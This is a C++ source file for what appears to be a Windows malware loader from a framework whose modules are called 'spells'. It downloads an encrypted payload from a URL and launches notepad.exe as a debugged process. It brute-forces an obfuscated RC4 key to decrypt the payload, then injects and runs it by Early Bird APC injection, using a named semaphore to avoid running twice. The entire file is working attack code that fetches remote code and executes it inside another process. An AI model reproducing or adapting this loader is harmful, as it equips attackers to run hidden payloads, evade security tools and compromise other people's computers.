
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../../Spells/UtilitySpells/FetchFromURL.h"



#include "../../Spells/EncryptionSpells/RC4.h"
#include "../../Spells/EncryptionSpells/KeyBrute.h"


#include "../../Spells/CreationSpells/CreateDebugged.h"


#include "../../Spells/RemoteExecutionSpells/EarlyBirdApcInjection.h"


using namespace std;
int main()
{
    PBYTE pPayloadAddress;
    SIZE_T pPayloadSize;
    string Url = "http://localhost:8000/payload.bin";
    LPWSTR szProcessName = L"notepad.exe";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

    

    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	    exit(0);

	// Payload is not running
    hThread = GetCurrentThread();
    

    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, (PDWORD)&pPayloadSize)){
        printf("Failed to fetch payload");
        return 0;
    }

    

    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){
        printf("Failed to find remote process");
        return 0;
    }

    unsigned char ProtectedKey[] = {
	0x60, 0x9A, 0xBC, 0x07, 0x97, 0x01, 0xDE, 0x1D, 0x6B, 0x9D, 0xC0, 0x47, 0xF3, 0x1A, 0x14, 0x72, 
	0xE9, 0x2A, 0xF3, 0x57, 0xF8, 0xD3, 0xED, 0x79, 0x25, 0xF7, 0x1B, 0x3C, 0x0F, 0x1C, 0xFB, 0xF6 };
    
    #define HINT_BYTE 0xDC
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);



    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){
        printf("Failed to execute payload");
        return 0;
    }
            
    free(pPayloadAddress);
   
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
    return 0;
}
